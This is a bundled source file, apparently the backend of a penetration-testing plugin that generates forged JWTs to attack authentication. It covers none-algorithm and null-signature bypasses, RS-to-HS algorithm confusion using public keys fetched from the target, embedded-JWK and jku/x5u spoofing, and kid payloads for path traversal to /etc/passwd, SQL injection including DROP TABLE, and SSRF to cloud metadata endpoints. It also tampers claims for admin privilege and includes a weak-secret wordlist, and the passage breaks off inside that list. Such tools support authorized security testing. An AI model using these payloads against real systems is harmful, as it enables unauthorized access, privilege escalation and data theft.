// packages/backend/src/index.ts
import { RequestSpec } from "caido:utils";

// packages/backend/src/crypto/jwt.ts
import { createHmac, createHash } from "crypto";
function b64urlEncode(data) {
  const bytes = typeof data === "string" ? Buffer.from(data, "utf8") : Buffer.from(data);
  return bytes.toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
}
function b64urlDecode(str) {
  const padded = str + "=".repeat((4 - str.length % 4) % 4);
  return Buffer.from(padded.replace(/-/g, "+").replace(/_/g, "/"), "base64");
}
function parseJWT(token) {
  const parts = token.split(".");
  if (parts.length < 2) throw new Error("Invalid JWT: must have at least 2 parts");
  const [headerB64, payloadB64, signatureB64 = ""] = parts;
  let header;
  let payload;
  try {
    header = JSON.parse(b64urlDecode(headerB64).toString("utf8"));
  } catch {
    throw new Error("Invalid JWT: malformed header");
  }
  try {
    payload = JSON.parse(b64urlDecode(payloadB64).toString("utf8"));
  } catch {
    throw new Error("Invalid JWT: malformed payload");
  }
  return { headerB64, payloadB64, signatureB64, header, payload };
}
function encodeUnsigned(header, payload) {
  return `${b64urlEncode(JSON.stringify(header))}.${b64urlEncode(JSON.stringify(payload))}`;
}
function buildJWT(header, payload, signature) {
  return `${b64urlEncode(JSON.stringify(header))}.${b64urlEncode(JSON.stringify(payload))}.${signature}`;
}
function signHMAC(header, payload, secret, alg) {
  const hashMap = { HS256: "sha256", HS384: "sha384", HS512: "sha512" };
  const signingInput = encodeUnsigned(header, payload);
  const hmac = createHmac(hashMap[alg], secret);
  hmac.update(signingInput);
  const sig = b64urlEncode(hmac.digest());
  return `${signingInput}.${sig}`;
}
var DIGEST_INFO = {
  sha256: "3031300d060960864801650304020105000420",
  sha384: "3041300d060960864801650304020205000430",
  sha512: "3051300d060960864801650304020305000440"
};
function derReadLen(buf, off) {
  const b = buf[off];
  if (b < 128) return { len: b, next: off + 1 };
  const nb = b & 127;
  let len = 0;
  for (let i = 0; i < nb; i++) len = len << 8 | buf[off + 1 + i];
  return { len, next: off + 1 + nb };
}
function derSkip(buf, off) {
  off++;
  const { len, next } = derReadLen(buf, off);
  return next + len;
}
function derReadBigInt(buf, off) {
  if (buf[off] !== 2) throw new Error(`Expected INTEGER at ${off}`);
  off++;
  const { len, next } = derReadLen(buf, off);
  const hex = buf.slice(next, next + len).toString("hex");
  return { value: hex ? BigInt("0x" + hex) : 0n, next: next + len };
}
function parsePKCS8RSAKey(pem) {
  const b64 = pem.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
  const der = Buffer.from(b64, "base64");
  let off = 0;
  if (der[off] !== 48) throw new Error("Not a PKCS8 key");
  off++;
  const { next: outerBody } = derReadLen(der, off);
  off = outerBody;
  off = derSkip(der, off);
  off = derSkip(der, off);
  if (der[off] !== 4) throw new Error("Expected OCTET STRING");
  off++;
  const { next: octBody } = derReadLen(der, off);
  off = octBody;
  if (der[off] !== 48) throw new Error("Expected RSAPrivateKey SEQUENCE");
  off++;
  const { next: rsaBody } = derReadLen(der, off);
  off = rsaBody;
  off = derSkip(der, off);
  const { value: n, next: afterN } = derReadBigInt(der, off);
  off = afterN;
  off = derSkip(der, off);
  const { value: d } = derReadBigInt(der, off);
  return { n, d };
}
function modpow(base, exp, mod) {
  if (mod === 1n) return 0n;
  let result = 1n;
  base = base % mod;
  while (exp > 0n) {
    if (exp & 1n) result = result * base % mod;
    exp >>= 1n;
    base = base * base % mod;
  }
  return result;
}
function emsaPKCS1(hash, hashAlg, keyLen) {
  const di = Buffer.from(DIGEST_INFO[hashAlg], "hex");
  const psLen = keyLen - 3 - di.length - hash.length;
  if (psLen < 8) throw new Error("Key too short for this hash algorithm");
  const em = Buffer.alloc(keyLen);
  let off = 0;
  em[off++] = 0;
  em[off++] = 1;
  em.fill(255, off, off + psLen);
  off += psLen;
  em[off++] = 0;
  di.copy(em, off);
  off += di.length;
  hash.copy(em, off);
  return em;
}
function signRSA(header, payload, privateKeyPem, alg) {
  if (alg.startsWith("PS")) {
    throw new Error("RSA-PSS signing not supported in this runtime");
  }
  const hashMap = {
    RS256: "sha256",
    RS384: "sha384",
    RS512: "sha512"
  };
  const hashAlg = hashMap[alg];
  if (!hashAlg) throw new Error(`Unsupported RSA algorithm: ${alg}`);
  const signingInput = encodeUnsigned(header, payload);
  const { n, d } = parsePKCS8RSAKey(privateKeyPem);
  const keyLen = Math.ceil(n.toString(2).length / 8);
  const hash = createHash(hashAlg).update(signingInput).digest();
  const em = emsaPKCS1(hash, hashAlg, keyLen);
  const m = BigInt("0x" + em.toString("hex"));
  const s = modpow(m, d, n);
  const sHex = s.toString(16).padStart(keyLen * 2, "0");
  const sBuf = Buffer.from(sHex, "hex");
  return `${signingInput}.${b64urlEncode(sBuf)}`;
}
function signECDSA(_header, _payload, _privateKeyPem, _alg) {
  throw new Error("ECDSA signing not supported in this runtime (requires elliptic curve math)");
}
function verifyHMAC(token, secret, alg) {
  const parts = token.split(".");
  if (parts.length !== 3) return false;
  const hashMap = { HS256: "sha256", HS384: "sha384", HS512: "sha512" };
  const signingInput = `${parts[0]}.${parts[1]}`;
  const hmac = createHmac(hashMap[alg], secret);
  hmac.update(signingInput);
  const expected = b64urlEncode(hmac.digest());
  return expected === parts[2];
}

// packages/backend/src/util.ts
import { randomBytes } from "crypto";
function nanoid(size = 12) {
  return randomBytes(size).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "").slice(0, size);
}
function parseCookies(cookieHeader) {
  const cookies = {};
  for (const pair of cookieHeader.split(";")) {
    const idx = pair.indexOf("=");
    if (idx === -1) continue;
    const key = pair.slice(0, idx).trim();
    const value = pair.slice(idx + 1).trim();
    cookies[key] = decodeURIComponent(value);
  }
  return cookies;
}
var JWT_REGEX = /^[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*$/;
function looksLikeJWT(value) {
  const trimmed = value.trim();
  if (!JWT_REGEX.test(trimmed)) return false;
  try {
    const parts = trimmed.split(".");
    const header = JSON.parse(Buffer.from(
      parts[0] + "=".repeat((4 - parts[0].length % 4) % 4),
      "base64"
    ).toString("utf8"));
    return typeof header.alg === "string";
  } catch {
    return false;
  }
}

// packages/backend/src/attacks/none.ts
var NONE_VARIANTS = ["none", "None", "NONE", "nOnE", "NoNe", "nONE", "NonE"];
function buildNoneAttacks(parsed) {
  const results = [];
  for (const alg of NONE_VARIANTS) {
    const header = { ...parsed.header, alg };
    results.push({
      id: nanoid(),
      technique: "none",
      techniqueName: `None Algorithm (alg="${alg}")`,
      description: `CVE-2015-9235: Sets alg to "${alg}" and strips the signature. Vulnerable servers accept unsigned tokens if they do not enforce signature presence.`,
      modifiedJWT: buildJWT(header, parsed.payload, ""),
      timestamp: Date.now()
    });
  }
  return results;
}

// packages/backend/src/attacks/nullSig.ts
function buildNullSigAttacks(parsed) {
  const signingInput = encodeUnsigned(parsed.header, parsed.payload);
  return [
    {
      id: nanoid(),
      technique: "nullSig",
      techniqueName: "Null Signature",
      description: "CVE-2020-28042: Retains the original algorithm but empties the signature. Vulnerable implementations skip signature verification when the signature field is empty.",
      modifiedJWT: `${signingInput}.`,
      timestamp: Date.now()
    }
  ];
}

// packages/backend/src/crypto/rsa.ts
function generateRSAKeyPair(_bits = 2048) {
  throw new Error("RSA key generation is not available in this runtime");
}
function encodeLength(len) {
  if (len < 128) return Buffer.from([len]);
  if (len < 256) return Buffer.from([129, len]);
  return Buffer.from([130, len >> 8 & 255, len & 255]);
}
function encodeSequence(data) {
  return Buffer.concat([Buffer.from([48]), encodeLength(data.length), data]);
}
function encodeInteger(data) {
  return Buffer.concat([Buffer.from([2]), encodeLength(data.length), data]);
}
function encodeBitString(data) {
  const inner = Buffer.concat([Buffer.from([0]), data]);
  return Buffer.concat([Buffer.from([3]), encodeLength(inner.length), inner]);
}
function derReadLength(buf, offset) {
  const first = buf[offset];
  if (first < 128) return { len: first, next: offset + 1 };
  const nb = first & 127;
  let len = 0;
  for (let i = 0; i < nb; i++) len = len << 8 | buf[offset + 1 + i];
  return { len, next: offset + 1 + nb };
}
function derSkip2(buf, offset) {
  offset++;
  const { len, next } = derReadLength(buf, offset);
  return next + len;
}
function x509CertToPublicKeyPem(certPem) {
  const b64 = certPem.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
  const der = Buffer.from(b64, "base64");
  let offset = 0;
  if (der[offset] !== 48) throw new Error("Not a certificate SEQUENCE");
  offset++;
  const { next: tbsStart } = derReadLength(der, offset);
  offset = tbsStart;
  if (der[offset] !== 48) throw new Error("TBSCertificate not a SEQUENCE");
  offset++;
  const { next: tbsBodyStart } = derReadLength(der, offset);
  offset = tbsBodyStart;
  if (der[offset] === 160) offset = derSkip2(der, offset);
  offset = derSkip2(der, offset);
  offset = derSkip2(der, offset);
  offset = derSkip2(der, offset);
  offset = derSkip2(der, offset);
  offset = derSkip2(der, offset);
  if (der[offset] !== 48) throw new Error("SPKI not found in certificate");
  const spkiStart = offset;
  offset++;
  const { len: spkiLen, next: spkiBodyStart } = derReadLength(der, offset);
  const spki = der.slice(spkiStart, spkiBodyStart + spkiLen);
  const pem64 = spki.toString("base64");
  const lines = pem64.match(/.{1,64}/g).join("\n");
  return `-----BEGIN PUBLIC KEY-----
${lines}
-----END PUBLIC KEY-----
`;
}
function publicKeyPemToRawBytes(keyPem) {
  const b64 = keyPem.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
  return Buffer.from(b64, "base64");
}
function jwkToPublicKeyPem(jwk) {
  if (jwk.kty === "RSA") {
    return rsaJwkToSpkiPem(jwk);
  }
  if (jwk.kty === "EC") {
    return ecJwkToSpkiPem(jwk);
  }
  throw new Error(`Unsupported JWK kty: ${jwk.kty}`);
}
function rsaJwkToSpkiPem(jwk) {
  if (!jwk.n || !jwk.e) throw new Error("RSA JWK missing n or e");
  const nBuf = b64urlDecode(jwk.n);
  const eBuf = b64urlDecode(jwk.e);
  const nDer = nBuf[0] & 128 ? Buffer.concat([Buffer.from([0]), nBuf]) : nBuf;
  const eDer = eBuf[0] & 128 ? Buffer.concat([Buffer.from([0]), eBuf]) : eBuf;
  const rsaKeySeq = encodeSequence(Buffer.concat([encodeInteger(nDer), encodeInteger(eDer)]));
  const algId = encodeSequence(Buffer.concat([
    Buffer.from("06092a864886f70d010101", "hex"),
    // OID rsaEncryption
    Buffer.from("0500", "hex")
    // NULL
  ]));
  const spki = encodeSequence(Buffer.concat([algId, encodeBitString(rsaKeySeq)]));
  const b64 = spki.toString("base64");
  const lines = b64.match(/.{1,64}/g).join("\n");
  return `-----BEGIN PUBLIC KEY-----
${lines}
-----END PUBLIC KEY-----
`;
}
function ecJwkToSpkiPem(jwk) {
  if (!jwk.x || !jwk.y || !jwk.crv) throw new Error("EC JWK missing x, y, or crv");
  const curveOids = {
    "P-256": "06082a8648ce3d030107",
    "P-384": "06052b81040022",
    "P-521": "06052b81040023"
  };
  const pointLens = { "P-256": 32, "P-384": 48, "P-521": 66 };
  const oidHex = curveOids[jwk.crv];
  if (!oidHex) throw new Error(`Unsupported EC curve: ${jwk.crv}`);
  const xBuf = b64urlDecode(jwk.x);
  const yBuf = b64urlDecode(jwk.y);
  const coordLen = pointLens[jwk.crv];
  const xPadded = Buffer.alloc(coordLen);
  const yPadded = Buffer.alloc(coordLen);
  xBuf.copy(xPadded, coordLen - xBuf.length);
  yBuf.copy(yPadded, coordLen - yBuf.length);
  const point = Buffer.concat([Buffer.from([4]), xPadded, yPadded]);
  const ecPublicKeyOid = Buffer.from("06072a8648ce3d0201", "hex");
  const curveOid = Buffer.from(oidHex, "hex");
  const algId = encodeSequence(Buffer.concat([ecPublicKeyOid, curveOid]));
  const spki = encodeSequence(Buffer.concat([algId, encodeBitString(point)]));
  const b64 = spki.toString("base64");
  const lines = b64.match(/.{1,64}/g).join("\n");
  return `-----BEGIN PUBLIC KEY-----
${lines}
-----END PUBLIC KEY-----
`;
}
function jwksToPublicKeys(jwks) {
  const pems = [];
  for (const jwk of jwks.keys) {
    try {
      pems.push(jwkToPublicKeyPem(jwk));
    } catch {
    }
  }
  return pems;
}
function buildJWKSDocument(publicJwk, kid = "jwt-attacker-key") {
  return {
    keys: [{ ...publicJwk, use: "sig", kid, alg: "RS256" }]
  };
}

// packages/backend/src/crypto/ecdsa.ts
function generateECKeyPair(_alg) {
  throw new Error("EC key generation is not available in this runtime");
}
function ecPublicKeyPemToRawBytes(keyPem) {
  return publicKeyPemToRawBytes(keyPem);
}
function buildECJWKS(publicJwk, alg, kid = "jwt-attacker-ec-key") {
  return {
    keys: [{ ...publicJwk, use: "sig", kid, alg }]
  };
}

// packages/backend/src/types.ts
var COMMON_JWKS_PATHS = [
  "/.well-known/jwks.json",
  "/.well-known/openid-configuration",
  "/jwks.json",
  "/jwks",
  "/.well-known/keys",
  "/api/auth/keys",
  "/api/auth/jwks",
  "/oauth/jwks",
  "/oauth/v2/keys",
  "/v2/keys",
  "/auth/keys",
  "/auth/jwks",
  "/.well-known/jwt-keys",
  "/api/v1/jwks.json",
  "/realms/master/protocol/openid-connect/certs",
  "/connect/jwks_uri"
];

// packages/backend/src/crypto/certFetch.ts
async function fetchTLSCertPem(_host, _port = 443) {
  throw new Error("TLS certificate fetching not available in this runtime");
}
async function fetchURL(url, timeoutMs = 8e3) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const res = await fetch(url, {
      signal: controller.signal,
      headers: { "User-Agent": "Mozilla/5.0" }
    });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return await res.text();
  } finally {
    clearTimeout(timer);
  }
}
async function fetchJWKS(url) {
  try {
    const body = await fetchURL(url);
    const parsed = JSON.parse(body);
    if (Array.isArray(parsed.keys)) return parsed;
    return null;
  } catch {
    return null;
  }
}
async function fetchOpenIDConfig(issuerUrl) {
  try {
    const configUrl = `${issuerUrl.replace(/\/$/, "")}/.well-known/openid-configuration`;
    const body = await fetchURL(configUrl);
    const config = JSON.parse(body);
    return config.jwks_uri ?? null;
  } catch {
    return null;
  }
}
async function discoverJWKS(baseUrl, extraPaths = []) {
  let origin;
  try {
    const parsed = new URL(baseUrl);
    origin = `${parsed.protocol}//${parsed.host}`;
  } catch {
    return [];
  }
  const pathsToTry = [...COMMON_JWKS_PATHS, ...extraPaths];
  const results = [];
  try {
    const jwksUri = await fetchOpenIDConfig(origin);
    if (jwksUri) {
      const jwks = await fetchJWKS(jwksUri);
      if (jwks) results.push({ url: jwksUri, keys: jwks.keys });
    }
  } catch {
  }
  for (let i = 0; i < pathsToTry.length; i += 5) {
    const batch = pathsToTry.slice(i, i + 5);
    const settled = await Promise.allSettled(
      batch.map(async (path) => {
        const url = `${origin}${path}`;
        const jwks = await fetchJWKS(url);
        if (jwks && jwks.keys.length > 0) return { url, keys: jwks.keys };
        return null;
      })
    );
    for (const r of settled) {
      if (r.status === "fulfilled" && r.value) results.push(r.value);
    }
  }
  return results;
}

// packages/backend/src/attacks/algConfusion.ts
var ALG_CONFUSION_MAP = {
  RS256: "HS256",
  RS384: "HS384",
  RS512: "HS512",
  PS256: "HS256",
  PS384: "HS384",
  PS512: "HS512",
  ES256: "HS256",
  ES384: "HS384",
  ES512: "HS512"
};
function isAsymmetricAlg(alg) {
  return alg.startsWith("RS") || alg.startsWith("PS") || alg.startsWith("ES");
}
function publicKeyPemToSecret(keyPem, originalAlg) {
  if (originalAlg.startsWith("ES")) {
    return ecPublicKeyPemToRawBytes(keyPem);
  }
  return publicKeyPemToRawBytes(keyPem);
}
function makeAttack(parsed, hmacAlg, publicKeyPem, sourceDesc) {
  const header = { ...parsed.header, alg: hmacAlg };
  delete header.jku;
  delete header.jwk;
  delete header.x5u;
  delete header.x5c;
  delete header.kid;
  const secret = publicKeyPemToSecret(publicKeyPem, parsed.header.alg);
  const jwt = signHMAC(header, parsed.payload, secret, hmacAlg);
  return {
    id: nanoid(),
    technique: "algConfusion",
    techniqueName: `Algorithm Confusion (${parsed.header.alg} \u2192 ${hmacAlg}, ${sourceDesc})`,
    description: `CVE-2016-5431: Re-signs the token as ${hmacAlg} using the server's RSA/EC public key (${sourceDesc}) as the HMAC secret. Vulnerable servers using the same key object for both RS/ES and HS verification will accept this token.`,
    modifiedJWT: jwt,
    timestamp: Date.now()
  };
}
async function buildAlgConfusionAttacks(parsed, requestHost, requestPort, requestTls, config, recoveredKeys = []) {
  const originalAlg = parsed.header.alg;
  if (!isAsymmetricAlg(originalAlg)) return [];
  const hmacAlg = ALG_CONFUSION_MAP[originalAlg];
  const results = [];
  const addKey = (pem, source) => {
    try {
      results.push(makeAttack(parsed, hmacAlg, pem, source));
    } catch {
    }
  };
  if (config.customPublicKeyPem) {
    addKey(config.customPublicKeyPem, "configured public key");
  }
  if (config.customCertPem) {
    try {
      const pem = x509CertToPublicKeyPem(config.customCertPem);
      addKey(pem, "configured certificate");
    } catch {
    }
  }
  if (requestTls || requestPort === 443) {
    try {
      const certPem = await fetchTLSCertPem(requestHost, requestPort);
      const pubKeyPem = x509CertToPublicKeyPem(certPem);
      addKey(pubKeyPem, "TLS certificate");
    } catch {
    }
  }
  if (parsed.header.jku) {
    try {
      const jwks = await fetchJWKS(parsed.header.jku);
      if (jwks) {
        for (const pem of jwksToPublicKeys(jwks)) {
          addKey(pem, `jku (${parsed.header.jku})`);
        }
      }
    } catch {
    }
  }
  if (parsed.header.x5c && Array.isArray(parsed.header.x5c) && parsed.header.x5c.length > 0) {
    try {
      const certDer = Buffer.from(parsed.header.x5c[0], "base64");
      const certPem = `-----BEGIN CERTIFICATE-----
${certDer.toString("base64").match(/.{1,64}/g).join("\n")}
-----END CERTIFICATE-----
`;
      const pubKeyPem = x509CertToPublicKeyPem(certPem);
      addKey(pubKeyPem, "embedded x5c cert");
    } catch {
    }
  }
  const proto = requestTls ? "https" : "http";
  const port = requestTls && requestPort === 443 || !requestTls && requestPort === 80 ? "" : `:${requestPort}`;
  const baseUrl = `${proto}://${requestHost}${port}`;
  try {
    const discovered = await discoverJWKS(baseUrl, config.extraJwksPaths);
    for (const result of discovered) {
      for (const pem of jwksToPublicKeys({ keys: result.keys })) {
        addKey(pem, `JWKS (${result.url})`);
      }
    }
  } catch {
  }
  for (const pem of recoveredKeys) {
    addKey(pem, "recovered from HTTP history");
  }
  return results;
}

// packages/backend/src/attacks/embeddedJwk.ts
function buildEmbeddedJWKAttacks(parsed) {
  const alg = parsed.header.alg;
  const results = [];
  const attempt = (genFn, targetAlg, signFn) => {
    try {
      const { publicJwk, privateKeyPem } = genFn();
      const header = {
        ...parsed.header,
        alg: targetAlg,
        jwk: publicJwk,
        // Remove fields that could conflict
        jku: void 0,
        x5u: void 0,
        x5c: void 0,
        kid: void 0
      };
      const jwt = signFn(header, parsed.payload, privateKeyPem, targetAlg);
      results.push({
        id: nanoid(),
        technique: "embeddedJwk",
        techniqueName: `Embedded JWK (${targetAlg})`,
        description: 'CVE-2018-0114: Generates a fresh key pair and embeds the public key in the JWT header as a "jwk" parameter, then re-signs with the corresponding private key. Vulnerable servers that use the embedded jwk field for verification will accept this.',
        modifiedJWT: jwt,
        timestamp: Date.now()
      });
    } catch {
    }
  };
  attempt(
    () => generateRSAKeyPair(2048),
    "RS256",
    (h, p, k, a) => signRSA(h, p, k, a)
  );
  if (alg.startsWith("ES") || alg.startsWith("RS") || alg.startsWith("PS")) {
    const ecAlg = alg.startsWith("ES") ? alg : "ES256";
    attempt(
      () => generateECKeyPair(ecAlg),
      ecAlg,
      (h, p, k, a) => signECDSA(h, p, k, a)
    );
  }
  return results;
}

// packages/backend/src/attacks/jkuSpoof.ts
function buildJKUSpoofAttacks(parsed, config) {
  const alg = parsed.header.alg;
  const results = [];
  let jwksContent = null;
  let jwksKey = null;
  if (!config.jwksUrl) {
    return { attacks: [], jwksContent: null, jwksKey: null };
  }
  const targetAlg = alg.startsWith("ES") ? alg : "RS256";
  const kid = "jwt-attacker-spoof-key";
  let publicJwk;
  let privateKeyPem;
  let jwks;
  if (targetAlg.startsWith("ES")) {
    const ecAlg = targetAlg;
    if (config.customPrivateKeyPem) {
      privateKeyPem = config.customPrivateKeyPem;
      const kp = generateECKeyPair(ecAlg);
      publicJwk = kp.publicJwk;
    } else {
      const kp = generateECKeyPair(ecAlg);
      publicJwk = kp.publicJwk;
      privateKeyPem = kp.privateKeyPem;
    }
    jwks = buildECJWKS(publicJwk, ecAlg, kid);
  } else {
    if (config.customPrivateKeyPem) {
      privateKeyPem = config.customPrivateKeyPem;
      const kp = generateRSAKeyPair(2048);
      publicJwk = kp.publicJwk;
    } else {
      const kp = generateRSAKeyPair(2048);
      publicJwk = kp.publicJwk;
      privateKeyPem = kp.privateKeyPem;
    }
    jwks = buildJWKSDocument(publicJwk, kid);
  }
  jwksContent = JSON.stringify(jwks, null, 2);
  jwksKey = privateKeyPem;
  try {
    const headerJku = {
      ...parsed.header,
      alg: targetAlg,
      jku: config.jwksUrl,
      kid,
      jwk: void 0,
      x5u: void 0,
      x5c: void 0
    };
    const jwt = targetAlg.startsWith("ES") ? signECDSA(headerJku, parsed.payload, privateKeyPem, targetAlg) : signRSA(headerJku, parsed.payload, privateKeyPem, "RS256");
    results.push({
      id: nanoid(),
      technique: "jkuSpoof",
      techniqueName: `JKU Spoofing (${targetAlg})`,
      description: `Sets the jku header to ${config.jwksUrl} and signs with a fresh private key. The server must be able to reach your JWKS endpoint. Host the generated JWKS JSON at that URL before sending this request.`,
      modifiedJWT: jwt,
      timestamp: Date.now()
    });
  } catch {
  }
  try {
    const headerX5u = {
      ...parsed.header,
      alg: targetAlg,
      x5u: config.jwksUrl,
      // same URL — user can host a cert chain there too
      kid,
      jwk: void 0,
      jku: void 0,
      x5c: void 0
    };
    const jwt = targetAlg.startsWith("ES") ? signECDSA(headerX5u, parsed.payload, privateKeyPem, targetAlg) : signRSA(headerX5u, parsed.payload, privateKeyPem, "RS256");
    results.push({
      id: nanoid(),
      technique: "x5uSpoof",
      techniqueName: `X5U Spoofing (${targetAlg})`,
      description: `Sets the x5u header to ${config.jwksUrl} and signs with a fresh private key. Host the generated JWKS / certificate chain at that URL.`,
      modifiedJWT: jwt,
      timestamp: Date.now()
    });
  } catch {
  }
  return { attacks: results, jwksContent, jwksKey };
}

// packages/backend/src/attacks/kidInject.ts
var PATH_TRAVERSAL_KIDS = [
  {
    kid: "../../../../dev/null",
    secret: Buffer.from(""),
    description: "Path traversal to /dev/null (empty secret)"
  },
  {
    kid: "../../../../../../dev/null",
    secret: Buffer.from(""),
    description: "Deeper path traversal to /dev/null (empty secret)"
  },
  {
    kid: "/dev/null",
    secret: Buffer.from(""),
    description: "Absolute path /dev/null (empty secret)"
  },
  {
    kid: "../../../../proc/sys/kernel/randomize_va_space",
    secret: Buffer.from("2"),
    description: "Path traversal to Linux kernel file (typical content: '2')"
  },
  {
    kid: "../../../../etc/passwd",
    secret: Buffer.from(""),
    description: "Path traversal to /etc/passwd"
  },
  {
    kid: "../../../../windows/win.ini",
    secret: Buffer.from(""),
    description: "Path traversal to Windows win.ini"
  }
];
var SQL_INJECTION_KIDS = [
  {
    kid: "' UNION SELECT 'secret'-- -",
    secret: Buffer.from("secret"),
    description: "SQL UNION injection returning 'secret' as the key"
  },
  {
    kid: "' UNION SELECT 'a'-- -",
    secret: Buffer.from("a"),
    description: "SQL UNION injection returning 'a' as the key"
  },
  {
    kid: "' OR '1'='1",
    secret: Buffer.from(""),
    description: "SQL OR injection (tautology)"
  },
  {
    kid: "1 OR 1=1",
    secret: Buffer.from(""),
    description: "SQL numeric OR injection"
  },
  {
    kid: `" UNION SELECT 'secret'-- -`,
    secret: Buffer.from("secret"),
    description: "SQL UNION injection (double-quote variant)"
  },
  {
    kid: "; DROP TABLE users--",
    secret: Buffer.from(""),
    description: "SQL statement termination injection"
  }
];
var SSRF_KIDS = [
  {
    kid: "http://169.254.169.254/latest/meta-data/",
    secret: Buffer.from(""),
    description: "SSRF to AWS IMDSv1 metadata endpoint"
  },
  {
    kid: "http://metadata.google.internal/computeMetadata/v1/",
    secret: Buffer.from(""),
    description: "SSRF to GCP metadata endpoint"
  },
  {
    kid: "http://100.100.100.200/latest/meta-data/",
    secret: Buffer.from(""),
    description: "SSRF to Alibaba Cloud metadata endpoint"
  },
  {
    kid: "http://localhost/",
    secret: Buffer.from(""),
    description: "SSRF to localhost"
  }
];
var WEAK_KIDS = [
  {
    kid: "0",
    secret: Buffer.from("secret"),
    description: "Kid=0 with secret='secret'"
  },
  {
    kid: "1",
    secret: Buffer.from("secret"),
    description: "Kid=1 with secret='secret'"
  },
  {
    kid: "",
    secret: Buffer.from(""),
    description: "Empty kid with empty secret"
  }
];
function buildHSAttack(parsed, payload, category) {
  const alg = parsed.header.alg.startsWith("HS") ? parsed.header.alg : "HS256";
  const header = { ...parsed.header, alg, kid: payload.kid };
  const jwt = signHMAC(header, parsed.payload, payload.secret, alg);
  return {
    id: nanoid(),
    technique: "kidInject",
    techniqueName: `KID Injection \u2014 ${category}`,
    description: `Injects kid="${payload.kid}" \u2014 ${payload.description}`,
    modifiedJWT: jwt,
    timestamp: Date.now()
  };
}
function buildKIDInjectionAttacks(parsed) {
  const results = [];
  for (const payload of PATH_TRAVERSAL_KIDS) {
    results.push(buildHSAttack(parsed, payload, "Path Traversal"));
  }
  for (const payload of SQL_INJECTION_KIDS) {
    results.push(buildHSAttack(parsed, payload, "SQL Injection"));
  }
  for (const payload of SSRF_KIDS) {
    results.push(buildHSAttack(parsed, payload, "SSRF"));
  }
  for (const payload of WEAK_KIDS) {
    results.push(buildHSAttack(parsed, payload, "Weak KID"));
  }
  return results;
}

// packages/backend/src/attacks/claimTamper.ts
var ADMIN_FIELDS = {
  role: "admin",
  admin: true,
  is_admin: true,
  isAdmin: true,
  superuser: true,
  scope: "admin read write",
  permissions: ["admin", "read", "write"],
  group: "admin",
  groups: ["admin"],
  authorities: ["ROLE_ADMIN"]
};
var PRIVILEGE_ESCALATION_PAYLOADS = [
  { label: "Role=Admin", changes: { role: "admin" } },
  { label: "Admin=True", changes: { admin: true, is_admin: true } },
  { label: "Superuser+All Scope", changes: { superuser: true, scope: "openid profile email admin read write" } },
  { label: "Sub='admin'", changes: { sub: "admin" } },
  { label: "Sub='root'", changes: { sub: "root" } },
  { label: "Sub='administrator'", changes: { sub: "administrator" } },
  { label: "Full Admin Blast", changes: { ...ADMIN_FIELDS } }
];
var EXPIRY_MANIPULATIONS = [
  {
    label: "Expiry +10 years",
    mutate: (p) => {
      const now = Math.floor(Date.now() / 1e3);
      return {
        ...p,
        exp: now + 60 * 60 * 24 * 365 * 10,
        nbf: now - 60,
        iat: now
      };
    }
  },
  {
    label: "Remove expiry",
    mutate: (p) => {
      const out = { ...p };
      delete out.exp;
      return out;
    }
  }
];
function buildClaimTamperAttacks(parsed) {
  const results = [];
  for (const { label, changes } of PRIVILEGE_ESCALATION_PAYLOADS) {
    const payload = { ...parsed.payload, ...changes };
    results.push({
      id: nanoid(),
      technique: "claimTamper",
      techniqueName: `Claim Tamper \u2014 ${label}`,
      description: `Modifies payload claims (${label}) while preserving the original algorithm. The signature is invalid \u2014 surfaces servers that skip verification.`,
      modifiedJWT: buildJWT(parsed.header, payload, parsed.signatureB64),
      timestamp: Date.now()
    });
  }
  for (const { label, mutate } of EXPIRY_MANIPULATIONS) {
    const payload = mutate(parsed.payload);
    results.push({
      id: nanoid(),
      technique: "claimTamper",
      techniqueName: `Claim Tamper \u2014 ${label}`,
      description: `${label}: modifies temporal claims while preserving original algorithm and signature. Surfaces servers that do not validate expiry, or where expiry is checked separately from signature.`,
      modifiedJWT: buildJWT(parsed.header, payload, parsed.signatureB64),
      timestamp: Date.now()
    });
  }
  const stripped = { ...parsed.payload };
  for (const k of ["exp", "nbf", "iat", "jti", "iss", "aud"]) delete stripped[k];
  results.push({
    id: nanoid(),
    technique: "claimTamper",
    techniqueName: "Claim Tamper \u2014 Strip Security Claims",
    description: "Removes exp, nbf, iat, jti, iss, and aud claims with original signature. Tests whether the server enforces these validation steps independently.",
    modifiedJWT: buildJWT(parsed.header, stripped, parsed.signatureB64),
    timestamp: Date.now()
  });
  return results;
}

// packages/backend/src/wordlist.ts
var WEAK_JWT_SECRETS = [
  // Empty / trivial
  "",
  "secret",
  "Secret",
  "SECRET",
  // Common passwords
  "password",
  "Password",
  "PASSWORD",
  "password1",
  "Password1",
  "123456",
  "1234567890",
  "12345678",
  "123456789",
  "0123456789",
  "111111",
  "222222",
  "333333",
  "555555",
  "666666",
  "777777",
  "888888",
  "999999",
  "qwerty",
  "qwerty123",
  "abc123",
  "letmein",
  "letmein1",
  "monkey",
  "dragon",
  "master",
  "sunshine",
  "princess",
  "football",
  "baseball",
  "iloveyou",
  "trustno1",
  "abcdef",
  "abcdefghij",
  "1234abcd",
  "welcome",
  "Welcome1",
  "swordfish",
  "hello",
  "world",
  // JWT-specific
  "jwt-secret",
  "jwt_secret",
  "jwtSecret",
  "jwtSecret123",
  "jwt-key",
  "jwt_key",
  "jwtKey",
  "jwt-token",
  "auth-token",
  "authtoken",
  "your-secret-key",
  "your-256-bit-secret",
  "your-384-bit-secret",
  "your-512-bit-secret",
  "your-secret",
  "your_secret",
  "mysecret",
  "my_secret",
  "my-secret",
  "secretkey",
  "secret_key",
  "secret-key",
  "secretkey123",
  "supersecret",
  "super_secret",
  "super-secret",
  "shared-secret",
  "shared_secret",
  // Placeholder strings
  "change-this-to-a-secret",
  "please-change-me",
  "THIS_IS_NOT_SECURE",
  "NOT_SECURE",
  "CHANGEME",
  "CHANGE_ME",
  "changeme",
  "changeme!",
  "TODO_CHANGE_ME",
  "TODO",
  // Application/framework defaults
  "flask_secret",
  "django_secret",
  "rails_secret",
  "express_secret",
  "node_env_secret",
  "laravel_secret",
